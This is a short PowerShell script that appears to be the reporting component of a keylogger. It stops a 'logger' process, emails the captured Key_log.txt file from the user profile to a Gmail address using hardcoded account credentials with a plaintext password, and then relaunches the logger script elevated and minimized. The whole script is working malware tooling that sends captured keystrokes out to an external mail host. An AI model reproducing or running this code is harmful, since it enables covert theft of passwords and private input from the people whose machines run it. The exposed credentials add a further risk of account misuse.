Get-Process | Where-Object { $_.Name -eq "logger" } | Stop-Process
$SMTPServer = 'smtp.gmail.com'; $SMTPI = New-Object Net.Mail.SmtpClient($SMTPServer,587); $SMTPI.EnableSsl = $true; $SMTPI.Credentials = New-Object System.Net.NetworkCredential('j6848730@gmail.com','That#s70#sshow');$ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'j6848730@gmail.com'; $ReportEmail.To.Add('j6848730@gmail.com'); $ReportEmail.Subject = 'logger'; $ReportEmail.Body = 'The log is attached!'; $attachpath = echo $env:USERPROFILE\Key_log.txt; $ReportEmail.Attachments.Add($attachpath);$SMTPI.Send($ReportEmail);
Start-Sleep -s 15
echo "emailed"
Start-Process powershell.exe "C:\Users\usama\runlogger1.ps1" -Verb runAs -WindowStyle Minimized
echo "runned"
exit